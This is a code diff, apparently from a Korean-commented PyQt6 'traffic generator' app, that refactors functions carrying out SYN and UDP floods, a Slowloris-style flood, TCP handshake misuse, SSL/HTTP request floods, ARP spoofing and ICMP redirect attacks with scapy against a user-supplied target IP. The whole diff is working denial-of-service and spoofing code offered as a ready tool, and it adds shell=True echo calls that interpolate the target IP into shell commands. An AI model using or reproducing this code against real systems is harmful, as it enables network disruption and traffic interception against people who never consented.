@@ -13,51 +13,50 @@ import json
 from PyQt6.QtCore import Qt
 
 # SYN 플러드 공격을 수행하는 함수.
-def syn_flood(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
-    for _ in range(count):
+def syn_flood(target_ip, packet_count, packet_size, stop_flag):
+    for _ in range(packet_count):
         if stop_flag.value:
             break
         port = random.randint(1, 65535)
         payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
         packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
         send(packet, inter=0.0001)
+        subprocess.run(f'echo SYN packet sent to {target_ip}:{port}', shell=True)
 
 # UDP 플러드 공격을 수행하는 함수.
-def udp_flood(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
-    for _ in range(count):
+def udp_flood(target_ip, packet_count, packet_size, stop_flag):
+    for _ in range(packet_count):
         if stop_flag.value:
             break
         port = random.randint(1, 65535)
         payload_size = packet_size - 20 - 8 - 14  # IP header (20 bytes) + UDP header (8 bytes) + Ethernet header (14 bytes)
         packet = IP(dst=target_ip)/UDP(dport=port)/('X'*payload_size)
         send(packet, inter=0.0001)
+        subprocess.run(f'echo UDP packet sent to {target_ip}:{port}', shell=True)
 
 # HTTP Slowloris 공격을 수행하는 함수
-def http_slowloris(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
-    for _ in range(count):
+def http_slowloris(target_ip, packet_count, packet_size, stop_flag):
+    for _ in range(packet_count):
         if stop_flag.value:
             break
         payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
         packet = IP(dst=target_ip)/TCP(dport=80, flags='PA')/('X'*payload_size)
         send(packet, inter=0.0001)
+        subprocess.run(f'echo HTTP Slowloris packet sent to {target_ip}:80', shell=True)
 
 # TCP 핸드셰이크 오용 공격을 수행하는 함수.
-def tcp_handshake_misuse(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
-    for _ in range(count):
+def tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
+    for _ in range(packet_count):
         if stop_flag.value:
             break
         port = random.randint(1, 65535)
         payload_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
         packet = IP(dst=target_ip)/TCP(dport=port, flags='S')/('X'*payload_size)
         send(packet, inter=0.0001)
+        subprocess.run(f'echo TCP handshake misuse packet sent to {target_ip}:{port}', shell=True)
 
 # SSL/TLS 트래픽을 생성하는 함수.
-def ssl_traffic(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
+def ssl_traffic(target_ip, count, packet_size, stop_flag):
     import ssl
     import socket
     for _ in range(count):
@@ -69,17 +68,18 @@ def ssl_traffic(app_instance, target_ip, count, stop_flag):
                 data_size = packet_size - 20 - 20 - 14  # IP header (20 bytes) + TCP header (20 bytes) + Ethernet header (14 bytes)
                 data = b'GET / HTTP/1.1\r\nHost: ' + target_ip.encode() + b'\r\n' + b'X' * data_size + b'\r\n\r\n'
                 ssock.sendall(data)
+                subprocess.run(f'echo SSL/TLS packet sent to {target_ip}:443', shell=True)
 
 # HTTP 요청을 변조하는 함수.
-def http_request_modification(app_instance, target_ip, count, stop_flag):
-    packet_size = app_instance.get_packet_size()
+def http_request_modification(target_ip, packet_count, packet_size, stop_flag):
     import requests
-    for _ in range(count):
+    for _ in range(packet_count):
         if stop_flag.value:
             break
         headers = {'User-Agent': 'ModifiedUserAgent'}
         try:
             requests.get(f'http://{target_ip}', headers=headers)
+            subprocess.run(f'echo HTTP request sent to {target_ip}', shell=True)
         except requests.exceptions.RequestException:
             pass
 
@@ -87,8 +87,10 @@ def http_request_modification(app_instance, target_ip, count, stop_flag):
 def arp_spoof(target_ip, spoof_ip, stop_flag):
     while not stop_flag.value:
         # ARP 패킷 생성
+        # 목적지 MAC 주소를 명시적으로 설정
         arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op='is-at')
         send(arp_response, verbose=False)
+        subprocess.run(f'echo ARP spoofing packet sent to {target_ip}', shell=True)
 
 # ICMP 리다이렉트 공격을 수행하는 함수.
 def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
@@ -96,29 +98,30 @@ def icmp_redirect(target_ip, new_gateway_ip, stop_flag):
         # ICMP 리다이렉트 패킷 생성
         icmp_redirect_packet = IP(dst=target_ip)/ICMP(type=5, code=1, gw=new_gateway_ip)
         send(icmp_redirect_packet, verbose=False)
+        subprocess.run(f'echo ICMP redirect packet sent to {target_ip}', shell=True)
 
-def standalone_syn_flood(app_instance, target_ip, packet_count, stop_flag):
-    syn_flood(app_instance, target_ip, packet_count, stop_flag)
-
-
-def standalone_udp_flood(app_instance, target_ip, packet_count, stop_flag):
-    udp_flood(app_instance, target_ip, packet_count, stop_flag)
+def standalone_syn_flood(target_ip, packet_count, packet_size, stop_flag):
+    syn_flood(target_ip, packet_count, packet_size, stop_flag)
 
 
-def standalone_http_slowloris(app_instance, target_ip, packet_count, stop_flag):
-    http_slowloris(app_instance, target_ip, packet_count, stop_flag)
+def standalone_udp_flood(target_ip, packet_count, packet_size, stop_flag):
+    udp_flood(target_ip, packet_count, packet_size, stop_flag)
 
 
-def standalone_tcp_handshake_misuse(app_instance, target_ip, packet_count, stop_flag):
-    tcp_handshake_misuse(app_instance, target_ip, packet_count, stop_flag)
+def standalone_http_slowloris(target_ip, packet_count, packet_size, stop_flag):
+    http_slowloris(target_ip, packet_count, packet_size, stop_flag)
 
 
-def standalone_ssl_traffic(app_instance, target_ip, packet_count, stop_flag):
-    ssl_traffic(app_instance, target_ip, packet_count, stop_flag)
+def standalone_tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag):
+    tcp_handshake_misuse(target_ip, packet_count, packet_size, stop_flag)
 
 
-def standalone_http_request_modification(app_instance, target_ip, packet_count, stop_flag):
-    http_request_modification(app_instance, target_ip, packet_count, stop_flag)
+def standalone_ssl_traffic(target_ip, packet_count, packet_size, stop_flag):
+    ssl_traffic(target_ip, packet_count, packet_size, stop_flag)
+
+
+def standalone_http_request_modification(target_ip, packet_count, packet_size, stop_flag):
+    http_request_modification(target_ip, packet_count, packet_size, stop_flag)
 
 
 def standalone_arp_spoof(target_ip, spoof_ip, stop_flag):
@@ -277,22 +280,22 @@ class TrafficGeneratorApp(QWidget):
         self.main_app.show_main_screen()
 
     def run_syn_flood(self, target_ip, packet_count):
-        syn_flood(self, target_ip, packet_count, self.stop_flag)
+        syn_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_udp_flood(self, target_ip, packet_count):
-        udp_flood(self, target_ip, packet_count, self.stop_flag)
+        udp_flood(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_http_slowloris(self, target_ip, packet_count):
-        http_slowloris(self, target_ip, packet_count, self.stop_flag)
+        http_slowloris(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_tcp_handshake_misuse(self, target_ip, packet_count):
-        tcp_handshake_misuse(self, target_ip, packet_count, self.stop_flag)
+        tcp_handshake_misuse(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_ssl_traffic(self, target_ip, packet_count):
-        ssl_traffic(self, target_ip, packet_count, self.stop_flag)
+        ssl_traffic(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_http_request_modification(self, target_ip, packet_count):
-        http_request_modification(self, target_ip, packet_count, self.stop_flag)
+        http_request_modification(target_ip, packet_count, self.get_packet_size(), self.stop_flag)
 
     def run_arp_spoof(self, target_ip, spoof_ip):
         arp_spoof(target_ip, spoof_ip, self.stop_flag)
@@ -310,23 +313,24 @@ class TrafficGeneratorApp(QWidget):
         self.stop_flag.value = False  # 중단 플래그 초기화
         target_ip = self.ip_input.text().strip()
         packet_count = int(self.packet_count_input.text())
+        packet_size = self.get_packet_size()  # 패킷 크기 가져오기
         if self.is_valid_ip(target_ip):
             QMessageBox.information(self, "트래픽 생성", "트래픽 생성이 시작됩니다.")
             self.cmd_process = subprocess.Popen("start cmd /k echo 트래픽 생성 중...", shell=True)
 
             attack_methods = []
             if self.syn_flood_checkbox.isChecked():
-                attack_methods.append((standalone_syn_flood, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_syn_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.udp_flood_checkbox.isChecked():
-                attack_methods.append((standalone_udp_flood, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_udp_flood, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.http_slowloris_checkbox.isChecked():
-                attack_methods.append((standalone_http_slowloris, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_http_slowloris, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.tcp_handshake_misuse_checkbox.isChecked():
-                attack_methods.append((standalone_tcp_handshake_misuse, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_tcp_handshake_misuse, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.ssl_traffic_checkbox.isChecked():
-                attack_methods.append((standalone_ssl_traffic, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_ssl_traffic, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.http_request_modification_checkbox.isChecked():
-                attack_methods.append((standalone_http_request_modification, (self, target_ip, packet_count, self.stop_flag)))
+                attack_methods.append((standalone_http_request_modification, (target_ip, packet_count, packet_size, self.stop_flag)))
             if self.arp_spoofing_checkbox.isChecked():
                 # ARP 스푸핑을 위한 추가 입력 필요
                 spoof_ip = "192.168.1.1"  # 예시 IP, 실제로는 사용자 입력 필요
